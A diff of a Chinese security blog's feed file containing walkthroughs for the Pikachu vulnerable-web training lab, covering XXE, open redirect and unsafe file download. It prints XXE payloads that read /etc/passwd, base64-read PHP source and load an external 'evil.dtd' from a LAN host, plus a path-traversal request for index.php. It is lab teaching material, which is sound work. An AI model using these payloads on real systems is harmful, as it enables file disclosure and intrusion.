+<p>则可能存在XXE漏洞</p>
+<h5 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="协议调用"><a href="#协议调用" class="headerlink" title="协议调用"></a>协议调用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230110154213177.png" alt="image-20230110154213177"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://cloud.tencent.com/developer/article/2090744">https://cloud.tencent.com/developer/article/2090744</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt;</span><br><span class="line">	&lt;!ENTITY test SYSTEM &quot;http://192.168.1.111/evil.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
@@ -1298,6 +1366,28 @@
       </categories>
   </entry>
   <entry>
+    <title>pikachu靶场系列-不安全的URL跳转</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84URL%E8%B7%B3%E8%BD%AC/</url>
+    <content><![CDATA[<p>如果后端采用了前端传进来的参数作为跳转的目的地，又没有做判断就可能跳转到钓鱼网站等恶意链接。</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20230110155041071.png" alt="image-20230110155041071"></p>
+<p>点击最后一个参数</p>
+<p>获取url</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=i</span><br></pre></td></tr></table></figure>
+
+<p>url指定重定向后的网页</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=https://www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>重定向到百度</p>
+<p><img src="/images/image-20230110155158474.png" alt="image-20230110155158474"></p>
+<p>可以抓个包看看</p>
+<p><img src="/images/image-20230110155246615.png" alt="image-20230110155246615"></p>
+<p>可以看到302响应包中的location字段指向百度</p>
+]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
     <title>pikachu靶场系列-xss</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/xss/</url>
     <content><![CDATA[<h1 id="XSS概述"><a href="#XSS概述" class="headerlink" title="XSS概述"></a>XSS概述</h1><p><img src="/./assets/1660183695659-3123c470-f608-4694-b555-23d2741c5e75.png" alt="img"></p>
@@ -1686,22 +1776,18 @@
       </categories>
   </entry>
   <entry>
-    <title>pikachu靶场系列-不安全的URL跳转</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84URL%E8%B7%B3%E8%BD%AC/</url>
-    <content><![CDATA[<p>如果后端采用了前端传进来的参数作为跳转的目的地，又没有做判断就可能跳转到钓鱼网站等恶意链接。</p>
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/images/image-20230110155041071.png" alt="image-20230110155041071"></p>
-<p>点击最后一个参数</p>
-<p>获取url</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=i</span><br></pre></td></tr></table></figure>
+    <title>pikachu靶场系列-不安全的文件下载</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
+    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>当存在文件下载功能时，如果没有做好限制，则可能会造成任意文件下载，源码泄露等严重后果</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>抓取下载功能的数据包</p>
+<p><img src="/images/image-20230110105403955.png" alt="image-20230110105403955"></p>
+<p>文件下载的url为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=mbl.png</span><br></pre></td></tr></table></figure>
 
-<p>url指定重定向后的网页</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=https://www.baidu.com</span><br></pre></td></tr></table></figure>
+<p>如果未做好限制，则会造成任意文件下载</p>
+<h5 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../index.php</span><br></pre></td></tr></table></figure>
 
-<p>重定向到百度</p>
-<p><img src="/images/image-20230110155158474.png" alt="image-20230110155158474"></p>
-<p>可以抓个包看看</p>
-<p><img src="/images/image-20230110155246615.png" alt="image-20230110155246615"></p>
-<p>可以看到302响应包中的location字段指向百度</p>
+<p><img src="/images/image-20230110105601275.png" alt="image-20230110105601275"></p>
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
@@ -1814,24 +1900,6 @@
 <h5 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Zip Compressed</span><br></pre></td></tr></table></figure>
 
 <h5 id="doc-xls-xlt-ppt-apr"><a href="#doc-xls-xlt-ppt-apr" class="headerlink" title="doc;xls;xlt;ppt;apr"></a>doc;xls;xlt;ppt;apr</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MS Compound Document v1 or Lotus Approach APRfile</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>pikachu靶场系列-不安全的文件下载</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
-    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>当存在文件下载功能时，如果没有做好限制，则可能会造成任意文件下载，源码泄露等严重后果</p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>抓取下载功能的数据包</p>
-<p><img src="/images/image-20230110105403955.png" alt="image-20230110105403955"></p>
-<p>文件下载的url为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=mbl.png</span><br></pre></td></tr></table></figure>
-
-<p>如果未做好限制，则会造成任意文件下载</p>
-<h5 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../index.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230110105601275.png" alt="image-20230110105601275"></p>
-]]></content>
       <categories>
         <category>pikachu靶场系列</category>
       </categories>
